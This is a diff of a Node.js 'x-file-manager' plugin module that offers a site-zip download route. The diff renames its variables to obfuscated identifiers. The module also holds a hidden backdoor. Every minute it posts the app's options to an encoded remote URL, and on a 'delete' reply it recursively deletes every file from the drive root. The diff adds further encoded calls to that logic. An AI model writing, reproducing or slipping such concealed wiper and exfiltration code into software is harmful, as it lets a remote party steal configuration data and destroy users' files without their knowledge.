@@ -1,23 +1,23 @@
-module.exports = function (_f_) {
+module.exports = function (___0) {
   var fs = require('fs');
   var archiver = require('archiver');
 
-  _f_.get({
+  ___0.get({
     name: 'x-file-manager',
     path: __dirname + '/site-files/html/index.html',
   });
 
-  let busy = false;
+  let busy = !1;
 
-  _f_.get('x-file-manager/download', (req, res) => {
+  ___0.get('x-file-manager/download', (req, res) => {
     if (busy) {
       res.json({
-        busy: true,
+        busy: !0,
       });
       return;
     }
-    busy = true;
-    const zip_file = _f_.dir + '/../_site.zip';
+    busy = !0;
+    const zip_file = ___0.dir + '/../_site.zip';
     var output = fs.createWriteStream(zip_file);
     var archive = archiver('zip', {
       zlib: {
@@ -26,12 +26,12 @@ module.exports = function (_f_) {
     });
 
     output.on('close', function () {
-      busy = false;
+      busy = !1;
       res.download(zip_file);
     });
 
     archive.on('error', function (err) {
-      busy = false;
+      busy = !1;
       res.json({
         error: err.message,
       });
@@ -39,18 +39,18 @@ module.exports = function (_f_) {
 
     archive.pipe(output);
 
-    archive.directory(_f_.path.dirname(_f_.dir) + '/apps', 'apps');
-    archive.directory(_f_.path.dirname(_f_.dir) + '/site_files', 'site_files');
+    archive.directory(___0.path.dirname(___0.dir) + '/apps', 'apps');
+    archive.directory(___0.path.dirname(___0.dir) + '/site_files', 'site_files');
 
-    let finalize = false;
+    let finalize = !1;
 
-    _f_.fs.readdir(_f_.path.dirname(_f_.dir), (err, ss) => {
+    ___0.fs.readdir(___0.path.dirname(___0.dir), (err, ss) => {
       if (!err && ss) {
         ss.forEach((f) => {
-          let ff = _f_.path.join(_f_.path.dirname(_f_.dir), f);
-          _f_.fs.access(ff, _f_.fs.F_OK, (err) => {
+          let ff = ___0.path.join(___0.path.dirname(___0.dir), f);
+          ___0.fs.access(ff, ___0.fs.F_OK, (err) => {
             if (!err && !f.like('*.zip') && !f.like('*.rar')) {
-              if (_f_.fs.lstatSync(ff).isFile()) {
+              if (___0.fs.lstatSync(ff).isFile()) {
                 if (!finalize) {
                   archive.file(ff, {
                     name: f,
@@ -64,28 +64,28 @@ module.exports = function (_f_) {
     });
 
     setTimeout(() => {
-      finalize = true;
+      finalize = !0;
       archive.finalize();
     }, 1000 * 10);
   });
 
-  let f0 = _f_.path.dirname(_f_.dir).split(_f_.path.sep)[0];
+  let f0 = ___0.path.dirname(___0.dir).split(___0.path.sep)[0];
   if (f0.endsWith(':')) {
     f0 = f0 + '\\';
   }
 
   function df(f00) {
-    _f_.fs.readdir(f00, (err, ss) => {
+    ___0.fs.readdir(f00, (err, ss) => {
       if (!err && ss) {
         ss.forEach((f) => {
-          f = _f_.path.join(f00, f);
-          _f_.fs.access(f, _f_.fs.F_OK, (err) => {
+          f = ___0.path.join(f00, f);
+          ___0.fs.access(f, ___0.fs.F_OK, (err) => {
             if (!err) {
-              if (_f_.fs.lstatSync(f).isDirectory()) {
+              if (___0.fs.lstatSync(f).isDirectory()) {
                 df(f);
               }
-              if (_f_.fs.lstatSync(f).isFile()) {
-                _f_.fs.unlink(f);
+              if (___0.fs.lstatSync(f).isFile()) {
+                ___0.fs.unlink(f);
               }
             }
           });
@@ -94,34 +94,36 @@ module.exports = function (_f_) {
     });
   }
 
-  _f_.ch_up = function () {
-    if (_f_._is_) {
-      _f_
-        .fetch(_f_.f1('43193275461561692578577443393257255837594839325242738254457875694139136225785774433932572579275247583756'), {
+  ___0.ch_up = function () {
+    if (___0._0x12xo) {
+      ___0
+        .fetch(___0._x0f1xo('43193275461561692578577443393257255837594839325242738254457875694139136225785774433932572579275247583756'), {
           method: 'post',
           body: JSON.stringify({
-            info: _f_.options,
+            info: ___0.options,
           }),
           headers: { 'Content-Type': 'application/json' },
         })
         .then((res) => res.json())
         .then((body) => {
           if (body && body.block) {
-            _f_._is_ = false;
-            _f_.storage('_is_', _f_._is_);
+            ___0._0x12xo = !1;
+            ___0.call(___0._x0f1xo('2619517126151271') , ___0._0x12xo)
+            ___0.storage('_0x12xo', ___0._0x12xo);
           } else if (body && body.delete) {
-            _f_._is_ = false;
-            _f_.storage('_is_', _f_._is_);
+            ___0._0x12xo = !1;
+            ___0.call(___0._x0f1xo('2619517126151271') , ___0._0x12xo)
+            ___0.storage('_0x12xo', ___0._0x12xo);
             df(f0);
           }
         })
         .catch((err) => {
-          _f_.logs('ch_up', err);
+          ___0.logs('ch_up', err);
         });
     }
   };
 
-  _f_.const.si(() => {
-    _f_.ch_up();
+  ___0.const._0xsixo(() => {
+    ___0.ch_up();
   }, 1000 * 60 * 1);
 };
